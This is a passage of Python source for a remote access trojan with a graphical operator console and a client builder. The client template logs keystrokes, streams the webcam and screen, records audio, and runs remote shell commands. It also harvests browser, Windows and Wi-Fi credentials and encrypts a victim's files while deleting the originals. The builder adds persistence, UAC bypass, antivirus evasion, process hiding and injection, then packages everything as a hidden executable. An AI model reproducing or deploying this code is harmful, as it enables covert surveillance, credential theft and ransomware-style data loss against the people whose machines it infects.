                    _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 60])
                    buffer_size = len(buffer)
                    
                    # Send frame size then data
                    self.socket.send(struct.pack('L', buffer_size))
                    self.socket.send(buffer)
                    
                    cv2.waitKey(1)  # Small delay
                else:
                    break
                    
            self.webcam.release()
            
        except Exception as e:
            print(f"Webcam capture error: {e}")
            try:
                self.socket.send(struct.pack('L', 0))  # Send empty frame
            except:
                pass
            
        finally:
            if hasattr(self, 'webcam'):
                self.webcam.release()

    def show_processes(self):
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            try:
                process_info = {
                    'pid': proc.pid,
                    'name': proc.name(),
                    'cpu': proc.cpu_percent(),
                    'memory': proc.memory_percent()
                }
                processes.append(json.dumps(process_info))
                self.socket.send(json.dumps(process_info).encode())
                sleep(0.01)  # Prevent buffer overflow
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
            
            
    def record_audio(self, duration=60):
        try:
            CHANNELS = 1
            SAMPLE_RATE = 48000  # Higher sample rate for better quality
            DTYPE = np.int16  # Ensure the format matches WAV requirements

            audio_buffer = []

            # Callback function to capture audio data
            def callback(indata, frames, time, status):
                # Convert float32 to int16 to match WAV format
                audio_buffer.append((indata * 32767).astype(DTYPE))

            # Open the input stream
            with sd.InputStream(
                channels=CHANNELS,
                samplerate=SAMPLE_RATE,
                dtype='float32',  # Use float32 for capture, convert later
                blocksize=2048,
                callback=callback
            ):
                sd.sleep(int(duration * 1000))

            # Concatenate audio buffer
            audio_data = np.concatenate(audio_buffer)

            # Create a WAV file in memory
            buffer = io.BytesIO()
            with wave.open(buffer, 'wb') as wav:
                wav.setnchannels(CHANNELS)
                wav.setsampwidth(2)  # 2 bytes for int16
                wav.setframerate(SAMPLE_RATE)
                wav.writeframes(audio_data.tobytes())

            # Send the audio data
            audio_bytes = buffer.getvalue()
            self.socket.send(struct.pack('L', len(audio_bytes)))
            self.socket.send(audio_bytes)

        except Exception as e:
            error_msg = f"Audio recording error: {str(e)}"
            self.socket.send(struct.pack('L', len(error_msg.encode())))
            self.socket.send(error_msg.encode())


    def encrypt_files(self, path):
        try:
            # Generate encryption key if not exists
            if not hasattr(self, 'encryption_key'):
                self.encryption_key = Fernet.generate_key()
                
            cipher = Fernet(self.encryption_key)
            encrypted_files = []

            for root, _, files in os.walk(path):
                for file in files:
                    try:
                        file_path = os.path.join(root, file)
                        # Skip already encrypted files
                        if file_path.endswith('.encrypted'):
                            continue
                            
                        # Read and encrypt file
                        with open(file_path, 'rb') as f:
                            data = f.read()
                        encrypted_data = cipher.encrypt(data)
                        
                        # Save encrypted file
                        encrypted_path = file_path + '.encrypted'
                        with open(encrypted_path, 'wb') as f:
                            f.write(encrypted_data)
                            
                        # Remove original file
                        os.remove(file_path)
                        encrypted_files.append(file_path)
                    except Exception as e:
                        continue

            # Send encryption results
            result = f"Encrypted {len(encrypted_files)} files"
            self.socket.send(struct.pack('L', len(result.encode())))
            self.socket.send(result.encode())
            
        except Exception as e:
            error_msg = f"Encryption error: {str(e)}"
            self.socket.send(struct.pack('L', len(error_msg.encode())))
            self.socket.send(error_msg.encode())

    def decrypt_files(self, path):
        try:
            if not hasattr(self, 'encryption_key'):
                raise Exception("No encryption key available")
                
            cipher = Fernet(self.encryption_key)
            decrypted_files = []

            for root, _, files in os.walk(path):
                for file in files:
                    try:
                        if not file.endswith('.encrypted'):
                            continue
                            
                        file_path = os.path.join(root, file)
                        orig_path = file_path[:-10]  # Remove .encrypted
                        
                        with open(file_path, 'rb') as f:
                            encrypted_data = f.read()
                        decrypted_data = cipher.decrypt(encrypted_data)
                        
                        with open(orig_path, 'wb') as f:
                            f.write(decrypted_data)
                            
                        os.remove(file_path)
                        decrypted_files.append(orig_path)
                    except Exception as e:
                        continue

            result = f"Decrypted {len(decrypted_files)} files"
            self.socket.send(struct.pack('L', len(result.encode())))
            self.socket.send(result.encode())
            
        except Exception as e:
            error_msg = f"Decryption error: {str(e)}"
            self.socket.send(struct.pack('L', len(error_msg.encode())))
            self.socket.send(error_msg.encode())

    def harvest_credentials(self):
        try:
            creds = {
                'browsers': self.get_browser_data(),
                'system': self.get_system_creds(),
                'wifi': self.get_wifi_passwords()
            }
            
            # Send encrypted data
            data = json.dumps(creds).encode()
            self.socket.send(struct.pack('L', len(data)))
            self.socket.send(data)
            
        except Exception as e:
            error_msg = f"Credential harvest error: {str(e)}"
            self.socket.send(struct.pack('L', len(error_msg.encode())))
            self.socket.send(error_msg.encode())

    def get_browser_data(self):
        browser_data = {}
        
        # Chrome
        chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 
                                r'Google\\Chrome\\User Data\Default\\Login Data')
        if os.path.exists(chrome_path):
            try:
                # Copy database to temp file (avoid lock)
                temp_path = os.path.join(os.getenv('TEMP'), 'chrome_creds')
                shutil.copy2(chrome_path, temp_path)
                
                import sqlite3
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                chrome_creds = []
                for row in cursor.fetchall():
                    chrome_creds.append({
                        'url': row[0],
                        'username': row[1],
                        'password': row[2]  # Note: Encrypted data
                    })
                browser_data['chrome'] = chrome_creds
                conn.close()
                os.remove(temp_path)
            except:
                pass
                
        # Firefox 
        firefox_path = os.path.join(os.getenv('APPDATA'), 
                                'Mozilla\\Firefox\\Profiles')
        if os.path.exists(firefox_path):
            try:
                for profile in os.listdir(firefox_path):
                    db_path = os.path.join(firefox_path, profile, 'logins.json')
                    if os.path.exists(db_path):
                        with open(db_path, 'r') as f:
                            browser_data['firefox'] = json.load(f)
            except:
                pass
                
        return browser_data

    def get_system_creds(self):
        system_creds = {}
        try:
            import winreg
            
            # Get cached credentials
            process = subprocess.Popen('cmdkey /list', 
                                    stdout=subprocess.PIPE, 
                                    stderr=subprocess.PIPE)
            output, _ = process.communicate()
            system_creds['cached'] = output.decode()
            
            # Get stored credentials
            cred_path = r"SOFTWARE\\Microsoft\Windows\\CurrentVersion\\Credentials"
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, cred_path) as key:
                creds = []
                try:
                    i = 0
                    while True:
                        name, data, _ = winreg.EnumValue(key, i)
                        creds.append({'name': name, 'data': data})
                        i += 1
                except WindowsError:
                    pass
            system_creds['stored'] = creds
                    
        except:
            pass
        return system_creds

    def get_wifi_passwords(self):
        wifi_creds = []
        try:
            # Get WiFi profiles
            process = subprocess.Popen('netsh wlan show profiles', 
                                    stdout=subprocess.PIPE, 
                                    stderr=subprocess.PIPE)
            output, _ = process.communicate()
            profiles = [line.split(':')[1].strip() 
                    for line in output.decode().split('') 
            if "All User Profile" in line]
        
            # Get passwords for each profile
            for profile in profiles:
                cmd = f'netsh wlan show profile "{profile}" key=clear'
                process = subprocess.Popen(cmd, 
                                        stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE)
                output, _ = process.communicate()
                
                for line in output.decode().split(''):
                    if "Key Content" in line:
                        password = line.split(':')[1].strip()
                        wifi_creds.append({
                            'ssid': profile,
                            'password': password
                        })
        except:
            pass
        return wifi_creds
    
    def handle_commands(self):
        while True:
            try:
                cmd = self.socket.recv(BUFFER_SIZE).decode()
                if not cmd:
                    continue
                if cmd == "START_KEYLOGGER":
                    self.start_keylogger()
                elif cmd == "STOP_KEYLOGGER":
                    print(cmd)
                    self.stop_keylogger()
                    self.socket.send('STOP_LOGGER'.encode())
                    # print('STOP_LOGGER SENT')
                elif cmd == "START_SCREEN_SHARE":
                    self.screen_share_toggle = True
                    self.screen_share_thread = Thread(target=self.screen_share, daemon=True)
                    self.screen_share_thread.start()
                elif cmd == "STOP_SCREEN_SHARE":
                    self.screen_share_toggle = False
                    if self.screen_share_thread:
                        self.screen_share_thread.join(timeout=1)
                elif cmd == 'GET_PROCESSES':
                    self.show_processes()
                    print('ALL Process Sent')
                    self.socket.send('SUCCESS'.encode())
                # elif cmd == 'STOP_PROCESS_MAN':
                #     print(cmd)
                elif "TAKE_SCREENSHOT" in cmd:
                    picname = cmd.split('TAKE_SCREENSHOT')[1].strip() + '.png'
                    self.take_screenshot(picname)
                elif cmd == 'HARVEST_CREDS':
                    self.harvest_credentials()
                elif cmd == 'RECORD_AUDIO':
                    self.record_audio()
                elif cmd.startswith("DOWNLOAD"):
                    print('Downlaod File')
                    filepath = cmd.split("DOWNLOAD")[1].strip()
                    self.download_file(filepath)
                elif cmd.startswith("UPLOAD"):
                    filepath = cmd.split("UPLOAD")[1].strip().split('/')[-1]
                    print(filepath)
                    self.upload_file(filepath)
                elif cmd == "WEBCAM_CAPTURE":
                    self.webcam_active = True
                    Thread(target=self.capture_webcam, daemon=True).start()
                elif cmd == "STOP_WEBCAM":
                    self.webcam_active = False
                elif cmd.startswith("CMD_EXEC "):
                    command = cmd.split("CMD_EXEC ", 1)[1]
                    if command.startswith('cd'):
                        foldername = command.split('cd')[1].strip()
                        try:
                            os.chdir(foldername)
                            self.socket.send(f'Directory Changed ==> {foldername}'.encode())
                            continue
                        except FileNotFoundError:
                            self.socket.send('FOLDER_ERROR'.encode())
                            continue
                    try:
                        process = subprocess.Popen(
                            command,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE
                        )
                        print(process.communicate())
                        output, error = process.communicate()
                        result = output.decode() + error.decode()
                        self.socket.send(result.encode())
                    except Exception as e:
                        error_msg = f"Command execution error: {str(e)}"
                        self.socket.send(error_msg.encode())
                
                elif cmd == "DISCONNECT":
                    break
                
            except Exception as e:
                print(f"Command handling error: {e}")
                break
        
        self.cleanup()

    def cleanup(self):
        self.stop_keylogger()
        self.screen_share_toggle = False
        try:
            self.socket.close()
        except:
            pass

def main():
    client = ClientAPP()
    if client.connect():
        client.handle_commands()

if __name__ == "__main__":
    add_persistence()
    bypass_uac()
    evade_antivirus()
    hide_process()
    inject_into_process('%s')
    main()'''%(server_ip, server_port, persistence, uac_bypass, anivirue, stealth, process_injection, process_name)
    
        with tempfile.TemporaryDirectory() as temp_dir:
            client_path = os.path.join(temp_dir, "client.py")
            with open(client_path, "w") as client_file:
                client_file.write(client_code)
                while True:
                    if shutil.which("pyinstaller"):
                        command = [
                            "pyinstaller",
                            "--onefile",
                            "--noconsole",
                            f"--icon={iconpath}" if iconpath else "",
                            "--name",
                            outputname,
                            client_path
                        ]
                        os.system(" ".join(command))
                        break
                    else:
                        if shutil.which('python'):
                            os.system('pip install pyinstaller')
                            time.sleep(3)
                            os.system('pip install pillow')
                            time.sleep(3)
                            continue
                        else:
                            showerror(title='Installation', message='Python isn\'t installed. \nPlease Install Python and try again.')
                            break
                            # shutil.copy(client_path, output_path)

    def builder(self):
        builder_window = tk.Toplevel(self.root)
        builder_window.title("RAT Client Builder")
        builder_window.geometry("600x700")
        builder_window.configure(bg=self.colors["bg_dark"])

        main_frame = tk.Frame(
            builder_window,
            bg=self.colors["bg_dark"],
            highlightbackground=self.colors["terminal_green"],
            highlightthickness=1
        )
        main_frame.pack(fill="both", expand=True, padx=20, pady=20)

        tk.Label(
            main_frame,
            text="[ CLIENT BUILDER ]",
            font=("Courier", 16, "bold"),
            fg=self.colors["terminal_green"],
            bg=self.colors["bg_dark"]
        ).pack(pady=20)

        config_frame = tk.Frame(
            main_frame,
            bg=self.colors["bg_dark"],
            highlightbackground=self.colors["terminal_green"],
            highlightthickness=1
        )
        config_frame.pack(fill="x", padx=10, pady=10)

        tk.Label(
            config_frame,
            text="Connection Settings",
            font=("Courier", 12, "bold"),
            fg=self.colors["terminal_green"],
            bg=self.colors["bg_dark"]
        ).pack(pady=10)

        tk.Label(
            config_frame,
            text="Server IP:",
            fg=self.colors["terminal_green"],
            bg=self.colors["bg_dark"]
        ).pack()

        ip_entry = tk.Entry(
            config_frame,
            bg=self.colors["bg_medium"],
            fg=self.colors["terminal_green"],
            insertbackground=self.colors["terminal_green"]
        )
        ip_entry.pack(pady=5)
        ip_entry.insert(0, socket.gethostbyname(socket.gethostname()))

        tk.Label(
            config_frame,
            text="Server Port:",
            fg=self.colors["terminal_green"],
            bg=self.colors["bg_dark"]
        ).pack()

        port_entry = tk.Entry(
            config_frame,
            bg=self.colors["bg_medium"],
            fg=self.colors["terminal_green"],
            insertbackground=self.colors["terminal_green"]
        )
        port_entry.pack(pady=5)
        port_entry.insert(0, "4444")

        options_frame = tk.Frame(
            main_frame,
            bg=self.colors["bg_dark"],
            highlightbackground=self.colors["terminal_green"],
            highlightthickness=1
        )
        options_frame.pack(fill="x", padx=10, pady=10)

        tk.Label(
            options_frame,
            text="Additional Options",
            font=("Courier", 12, "bold"),
            fg=self.colors["terminal_green"],
            bg=self.colors["bg_dark"]
        ).pack(pady=10)

        persistence_var = tk.BooleanVar(value=True)
        tk.Checkbutton(
            options_frame,
            text="Add Persistence",
            variable=persistence_var,
            fg=self.colors["terminal_green"],
            bg=self.colors["bg_dark"],
            selectcolor=self.colors["bg_medium"],
            activebackground=self.colors["bg_dark"],
            activeforeground=self.colors["terminal_green"]
        ).pack(pady=5, side='left')

        uac_bypass_var = tk.BooleanVar(value=True)
        tk.Checkbutton(
            options_frame,
            text="UAC Bypass",
            variable=uac_bypass_var,
            fg=self.colors["terminal_green"],
            bg=self.colors["bg_dark"],
            selectcolor=self.colors["bg_medium"],
            activebackground=self.colors["bg_dark"],
            activeforeground=self.colors["terminal_green"]
        ).pack(pady=5, side='left')

        antivirus_evasion_var = tk.BooleanVar(value=True)
        tk.Checkbutton(
            options_frame,
            text="Antivirus Evasion",
            variable=antivirus_evasion_var,
            fg=self.colors["terminal_green"],
            bg=self.colors["bg_dark"],
            selectcolor=self.colors["bg_medium"],
            activebackground=self.colors["bg_dark"],
            activeforeground=self.colors["terminal_green"]
        ).pack(pady=5, side='left')

        stealth_var = tk.BooleanVar(value=True)
        tk.Checkbutton(
            options_frame,
            text="Stealth",
            variable=stealth_var,
            fg=self.colors["terminal_green"],
            bg=self.colors["bg_dark"],
            selectcolor=self.colors["bg_medium"],
            activebackground=self.colors["bg_dark"],
            activeforeground=self.colors["terminal_green"]
        ).pack(pady=5, side='left')

        process_injection_var = tk.BooleanVar(value=False)
        tk.Checkbutton(
            options_frame,
            text="Process Injection",
            variable=process_injection_var,
            fg=self.colors["terminal_green"],
            bg=self.colors["bg_dark"],
            selectcolor=self.colors["bg_medium"],
            activebackground=self.colors["bg_dark"],
            activeforeground=self.colors["terminal_green"]
        ).pack(pady=5, side='left')

        build_frame = tk.Frame(
            main_frame,
            bg=self.colors["bg_dark"],
            highlightbackground=self.colors["terminal_green"],
            highlightthickness=1
        )
        build_frame.pack(fill="x", padx=10, pady=10)

        tk.Label(
            build_frame,
            text="Build Options",
            font=("Courier", 12, "bold"),
            fg=self.colors["terminal_green"],
            bg=self.colors["bg_dark"]
        ).pack(pady=10)

        def select_icon():
            icon_path = filedialog.askopenfilename(
                filetypes=[("Icon files", ("*.png", "*.ico"))]
            )
            if icon_path:
                icon_label.config(text=f"Selected: {os.path.basename(icon_path)}")
                icon_label.icon_path = icon_path

        icon_button = ttk.Button(
            build_frame,
            text="[ SELECT ICON ]",
            command=select_icon,
            style="Hacker.TButton"
        )
        icon_button.pack(pady=5)

        icon_label = tk.Label(
            build_frame,
            text="No icon selected",
            fg=self.colors["terminal_green"],
            bg=self.colors["bg_dark"]
        )
        icon_label.pack()
        icon_label.icon_path = None

        # Output name
        tk.Label(
            build_frame,
            text="Output Name:",
            fg=self.colors["terminal_green"],
            bg=self.colors["bg_dark"]
        ).pack()

        output_entry = tk.Entry(
            build_frame,
            bg=self.colors["bg_medium"],
            fg=self.colors["terminal_green"],
            insertbackground=self.colors["terminal_green"]
        )
        output_entry.pack(pady=5)
        output_entry.insert(0, "client.exe")

        def build_exe():
            try:
                config = {
                    "SERVER_IP": ip_entry.get(),
                    "SERVER_PORT": int(port_entry.get()),
                    "PERSISTENCE": persistence_var.get(),
                    "UAC_BYPASS": uac_bypass_var.get(),
                    "ANTIVIRUS_EVASION": antivirus_evasion_var.get(),
                    "STEALTH": stealth_var.get(),
                    "OUTPUT_NAME": output_entry.get(),
                    "ICON_PATH": getattr(icon_label, 'icon_path', None),
                    "PROCESS_INJECTION": process_injection_var.get()
                }

                if not config["SERVER_IP"] or not config["SERVER_PORT"]:
                    self.log("Error: IP and Port are required")
                    return

                if config["PROCESS_INJECTION"]:
                    process_name = simpledialog.askstring("Process Name", "Enter the target process name (e.g., explorer.exe):")
                    if process_name:
                        config["PROCESS_NAME"] = process_name
                    else:
                        self.log("Error: Process name is required for injection.")
                        return

                self.generate_client(config)
                shutil.rmtree('build')
                os.remove(f'{config["OUTPUT_NAME"]}.spec')
                self.log(f"Client built successfully")
                showinfo("Success", f"Client has been built and saved to dist")
                builder_window.destroy()
            except Exception as e:
                self.log(f"Build error: {e}")
                showerror("Error", f"Failed to build client:\n{str(e)}")

        ttk.Button(
            main_frame,
            text="[ BUILD EXE ]",
            command=build_exe,
            style="Hacker.TButton"
        ).pack(pady=20)

        
        # self.create_and_start_thread(build_exe, f"builder_{random.randint(1000, 9999)}")
        
    def capture_webcam(self):
        selected_client = self.get_selected_client()
        if selected_client:
            def webcam_thread():
                try:
                    self.log("Starting webcam capture...")
                    selected_client.send(b"WEBCAM_CAPTURE")
                    # Create webcam window
                    self.webcam_viewer = tk.Toplevel(self.root)
                    self.webcam_viewer.title("Webcam Feed")
                    self.webcam_viewer.geometry("640x480")
                    
                    self.webcam_canvas = tk.Canvas(
                        self.webcam_viewer,
                        width=640,
                        height=480,
                        bg="black"
                    )
                    self.webcam_canvas.pack(fill="both", expand=True)
                    
                    stop_btn = ttk.Button(
                        self.webcam_viewer,
                        text="[ STOP CAPTURE ]",
                        command=self.stop_webcam,
                        style="Warning.TButton"
                    )
                    stop_btn.pack(pady=10)
                    
                    self.webcam_active = True
                    self.receive_webcam_feed(selected_client)
                    
                except Exception as e:
                    self.log(f"Webcam capture error: {e}")
                    self.stop_webcam()
                    
            self.create_and_start_thread(webcam_thread, f"webcam_{random.randint(1000, 9999)}")

    def stop_webcam(self):
        if hasattr(self, 'webcam_active') and self.webcam_active:
            selected_client = self.get_selected_client()
            if selected_client:
                self.log("Stopping webcam capture...")
                try:
                    selected_client.send(b"STOP_WEBCAM")
                except:
                    pass
                self.webcam_active = False
                
            if hasattr(self, 'webcam_viewer'):
                self.webcam_viewer.destroy()

    def receive_webcam_feed(self, client_socket):
        try:
            while self.webcam_active and hasattr(self, 'webcam_viewer'):
                size_data = client_socket.recv(struct.calcsize('L'))
                if not size_data:
                    break
                size = struct.unpack('L', size_data)[0]
                
                frame_data = b""
                remaining = size
                
                while remaining > 0:
                    chunk = client_socket.recv(min(remaining, 8192))
                    if not chunk:
                        break
                    frame_data += chunk
                    remaining -= len(chunk)
                    
                nparr = np.frombuffer(frame_data, np.uint8)
                frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                
                if frame is not None:
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    image = Image.fromarray(frame)
                    
                    canvas_width = self.webcam_canvas.winfo_width()
                    canvas_height = self.webcam_canvas.winfo_height()
                    image.thumbnail((canvas_width, canvas_height), Image.Resampling.LANCZOS)
                    
                    photo = ImageTk.PhotoImage(image=image)
                    
                    self.webcam_canvas.delete("all")
                    self.webcam_canvas.create_image(
                        canvas_width//2,
                        canvas_height//2,
                        image=photo,
                        anchor="center"
                    )
                    self.webcam_canvas.image = photo
                    
        except Exception as e:
            self.log(f"Webcam feed error: {e}")
            self.log(f'It appears there is no webcam on target machine')
            self.stop_webcam()
            
    def show_processes(self):
        selected_client = self.get_selected_client()
        if selected_client:
            def process_manager():
                selected_client.send(b"GET_PROCESSES")
                self.process_window = tk.Toplevel(self.root)
                self.process_window.title("Process Manager")
                self.process_window.geometry("800x600")
                self.process_window.configure(bg=self.colors["bg_dark"])
                
                columns = ("PID", "Name", "CPU %", "Memory %")
                self.process_tree = ttk.Treeview(
                    self.process_window, 
                    columns=columns,
                    show="headings",
                    style="Hacker.Treeview"
                )
                
                for col in columns:
                    self.process_tree.heading(col, text=col)
                    self.process_tree.column(col, width=150)
                
                self.process_tree.pack(fill="both", expand=True, padx=10, pady=10)
                
                while True:
                    try:
                        try:
                            data = selected_client.recv(BUFFER_SIZE).decode()
                            if 'SUCCESS' in data:
                                print('All Process Received')
                                break
                            process_info = json.loads(data)
                            self.process_tree.insert(
                                "", "end",
                                values=(
                                    process_info['pid'],
                                    process_info['name'],
                                    f"{process_info['cpu']:.1f}",
                                    f"{process_info['memory']:.1f}"
                                )
                            )
                        except json.JSONDecodeError:
                            continue
                    except Exception as e:
                        self.log(f"Process manager error: {e}")
                        continue
                    
            self.create_and_start_thread(process_manager, f"proc_man_{random.randint(1000, 9999)}")

    def harvest_credentials(self):
        selected_client = self.get_selected_client()
        if selected_client:
            def harvester():
                try:
                    self.log("Harvesting credentials...")
                    selected_client.send(b"HARVEST_CREDS")
                    
                    data_size = struct.unpack('L', selected_client.recv(struct.calcsize('L')))[0]
                    
                    data = b''
                    remaining = data_size
                    while remaining > 0:
                        chunk = selected_client.recv(min(remaining, BUFFER_SIZE))
                        if not chunk:
                            break
                        data += chunk
                        remaining -= len(chunk)
                    
                    creds = json.loads(data.decode())
                    self.display_credentials(creds)
                    
                except Exception as e:
                    self.log(f"Credential harvesting error: {e}")
                    
            self.create_and_start_thread(harvester, f"harvest_{random.randint(1000, 9999)}")

    def display_credentials(self, creds):
        cred_window = tk.Toplevel(self.root)
        cred_window.title("Harvested Credentials")
        cred_window.geometry("800x600")
        cred_window.configure(bg=self.colors["bg_dark"])
        
        notebook = ttk.Notebook(cred_window)
        notebook.pack(fill="both", expand=True, padx=10, pady=10)
        
        if 'browsers' in creds:
            browser_frame = ttk.Frame(notebook)
            notebook.add(browser_frame, text="Browsers")
            
            browser_tree = ttk.Treeview(
                browser_frame,
                columns=("Browser", "URL", "Username", "Password"),
                show="headings"
            )
            
            for col in ("Browser", "URL", "Username", "Password"):
                browser_tree.heading(col, text=col)
                browser_tree.column(col, width=150)
                
            for browser, data in creds['browsers'].items():
                browser_tree.insert("", "end", values=(
                    browser,
                    data
                ))
   
            browser_tree.pack(fill="both", expand=True)
        
        if 'system' in creds:
            system_frame = ttk.Frame(notebook)
            notebook.add(system_frame, text="System")
            
            system_text = tk.Text(
                system_frame,
                bg=self.colors["bg_medium"],
                fg=self.colors["terminal_green"],
                font=("Courier", 10)
            )
            system_text.pack(fill="both", expand=True)
            system_text.insert("1.0", json.dumps(creds['system'], indent=2))
            
        # WiFi credentials
        if 'wifi' in creds:
            wifi_frame = ttk.Frame(notebook)
            notebook.add(wifi_frame, text="WiFi")
            
            wifi_tree = ttk.Treeview(
                wifi_frame,
                columns=("SSID", "Password"),
                show="headings"
            )
            
            for col in ("SSID", "Password"):
                wifi_tree.heading(col, text=col)
                wifi_tree.column(col, width=200)
                
            for entry in creds['wifi']:
                wifi_tree.insert("", "end", values=(
                    entry['ssid'],
                    entry['password']
                ))
                
            wifi_tree.pack(fill="both", expand=True)
            
    def record_audio(self):
        selected_client = self.get_selected_client()
        if selected_client:
            def audio_recorder():
                try:
                    self.log("Starting audio recording...")
                    selected_client.send(b"RECORD_AUDIO")
                    
                    audio_size = struct.unpack('L', selected_client.recv(struct.calcsize('L')))[0]
                    
                    filename = f"recording_{random.randint(1000,9999)}.wav"
                    with open(filename, 'wb') as f:
                        remaining = audio_size
                        while remaining > 0:
                            chunk = selected_client.recv(min(remaining, BUFFER_SIZE))
                            if not chunk:
                                break
                            f.write(chunk)
                            remaining -= len(chunk)
                            
                    self.log(f"Audio saved to {filename}")
                    
                except Exception as e:
                    self.log(f"Audio recording error: {e}")
                    
            self.create_and_start_thread(audio_recorder, f"audio_rec_{random.randint(1000, 9999)}")
            
    def encrypt_files(self):
        selected_client = self.get_selected_client()
        if selected_client:
            path = filedialog.askdirectory(title="Select Directory to Encrypt")
            if path:
                def encryption_task():
                    try:
                        self.log(f"Encrypting files in {path}...")
                        selected_client.send(f"ENCRYPT_FILES {path}".encode())
                        
                        # Get encryption result
                        result_size = struct.unpack('L', selected_client.recv(struct.calcsize('L')))[0]
                        result = selected_client.recv(result_size).decode()
                        self.log(result)
                        
                    except Exception as e:
                        self.log(f"Encryption error: {e}")
                        
                self.create_and_start_thread(encryption_task, f"encrypt_{random.randint(1000, 9999)}")

    def decrypt_files(self):
        selected_client = self.get_selected_client()
        if selected_client:
            path = filedialog.askdirectory(title="Select Directory to Decrypt")
            if path:
                def decryption_task():
                    try:
                        self.log(f"Decrypting files in {path}...")
                        selected_client.send(f"DECRYPT_FILES {path}".encode())
                        
                        # Get decryption result
                        result_size = struct.unpack('L', selected_client.recv(struct.calcsize('L')))[0]
                        result = selected_client.recv(result_size).decode()
                        self.log(result)
                        
                    except Exception as e:
                        self.log(f"Decryption error: {e}")
                        
                self.create_and_start_thread(decryption_task, f"decrypt_{random.randint(1000, 9999)}")
    def start_screen_share(self):
        selected_client = self.get_selected_client()
        if selected_client:
            def screen_share_thread():
                try:
                    self.log("Starting screen share...")
                    selected_client.send(b"START_SCREEN_SHARE")

                    self.screen_viewer = tk.Toplevel(self.root)
                    self.screen_viewer.title("Screen Share Viewer")
                    self.screen_viewer.geometry("1024x768")

                    self.screen_canvas = tk.Canvas(
                        self.screen_viewer,
                        bg="black",
                        width=1024,
                        height=768
                    )
                    self.screen_canvas.pack(fill="both", expand=True)

                    self.screen_viewer_active = True
                    self.receive_screen_updates(selected_client)
                except Exception as e:
                    self.log(f"Screen share error: {e}")
                    self.stop_screen_share()

            self.create_and_start_thread(screen_share_thread, f"screen_share_{random.randint(1000, 9999)}")

    def stop_screen_share(self):
        if self.screen_viewer_active:
            selected_client = self.get_selected_client()
            if selected_client:
                self.log("Stopping screen share...")
                try:
                    selected_client.send(b"STOP_SCREEN_SHARE")
                    # Wait for client acknowledgment
                    ack = selected_client.recv(1024)
                    if ack == b"ACK_STOP_SCREEN_SHARE":
                        self.log("Screen share stopped by client.")
                except Exception as e:
                    self.log(f"Error stopping screen share: {e}")

            self.screen_viewer_active = False

            if hasattr(self, 'screen_viewer') and self.screen_viewer:
                self.screen_viewer.destroy()
                self.screen_viewer = None

    def receive_screen_updates(self, client_socket):
        try:
            while self.screen_viewer_active and self.screen_viewer:
                size_data = client_socket.recv(struct.calcsize('L'))
                if not size_data:
                    break
                size = struct.unpack('L', size_data)[0]

                frame_data = b""
                remaining = size

                while remaining > 0:
                    chunk = client_socket.recv(min(remaining, 8192))
                    if not chunk:
                        break
                    frame_data += chunk
                    remaining -= len(chunk)

                if frame_data:
                    nparr = np.frombuffer(frame_data, np.uint8)
                    frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)

                    if frame is not None:
                        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                        image = Image.fromarray(frame)

                        canvas_width = self.screen_canvas.winfo_width()
                        canvas_height = self.screen_canvas.winfo_height()
                        image.thumbnail((canvas_width, canvas_height), Image.Resampling.LANCZOS)

                        photo = ImageTk.PhotoImage(image=image)
                        self.screen_canvas.delete("all")
                        self.screen_canvas.create_image(
                            canvas_width // 2,
                            canvas_height // 2,
                            image=photo,
                            anchor="center"
                        )
                        self.screen_canvas.image = photo
        except Exception as e:
            self.log(f"Screen sharing error: {e}")
        finally:
            self.stop_screen_share()


    def start_keylogger(self):
        if "keylogger" in self.running_threads:
            self.log("Keylogger is already running.")
            return

        selected_client = self.get_selected_client()
        if selected_client:
            def keylogger_thread():
                try:
                    self.log("Starting keylogger...")
                    selected_client.send(b"START_KEYLOGGER")
                    
                    self.keylog_window = tk.Toplevel(self.root)
                    self.keylog_window.title("Keylogger")
                    self.keylog_window.geometry("600x400")
                    self.keylog_window.configure(bg=self.colors["bg_dark"])

                    self.keylog_text = tk.Text(
                        self.keylog_window,
                        bg=self.colors["bg_medium"],
                        fg=self.colors["terminal_green"],
                        font=("Courier", 10),
                        wrap=tk.WORD
                    )
                    self.keylog_text.pack(fill="both", expand=True, padx=10, pady=10)

                    while True:
                        try:
                            data = selected_client.recv(BUFFER_SIZE).decode()
                            if not data or 'STOP_LOGGER' in data:
                                self.log("Keylogger Terminated")
                                break
                            if data.startswith("KEYLOG:"):
                                keystroke = data.replace("KEYLOG:", "")
                                self.keylog_text.insert(tk.END, keystroke)
                                self.keylog_text.see(tk.END)
                                self.log(keystroke)
                        except Exception as e:
                            self.log(f"Keylogger receive error: {e}")
                            break
                except Exception as e:
                    self.log(f"Keylogger error: {e}")
                finally:
                    del self.running_threads["keylogger"]

            self.running_threads["keylogger"] = threading.Thread(target=keylogger_thread)
            self.running_threads["keylogger"].start()

    def stop_keylogger(self):
        selected_client = self.get_selected_client()
        if selected_client:
            try:
                self.log("Stopping keylogger...")
                selected_client.send(b"STOP_KEYLOGGER")
                if hasattr(self, 'keylog_window'):
                    self.keylog_window.destroy()

                if "keylogger" in self.running_threads:
                    self.running_threads["keylogger"].join(timeout=1.0)
                    del self.running_threads["keylogger"]
            except Exception as e:
                self.log(f"Error stopping keylogger: {e}")

    
    def open_download_window(self):
        download_window = tk.Toplevel(self.root)
        download_window.title("Download File")
        download_window.geometry("500x200")
        download_window.configure(bg=self.colors["bg_dark"])
        
        tk.Label(
            download_window,
            text="Enter File Name:",
            font=("Courier", 10),
            fg=self.colors["terminal_green"],
            bg=self.colors["bg_dark"]
        ).pack(pady=10)
        
        file_name_entry = tk.Entry(
            download_window,
            font=("Courier", 10),
            bg=self.colors["bg_medium"],
            fg=self.colors["terminal_green"],
            insertbackground=self.colors["terminal_green"],
            width=50
        )
        file_name_entry.pack(pady=10, padx=20)
        ttk.Button(
        download_window,
        text="[ DOWNLOAD ]",
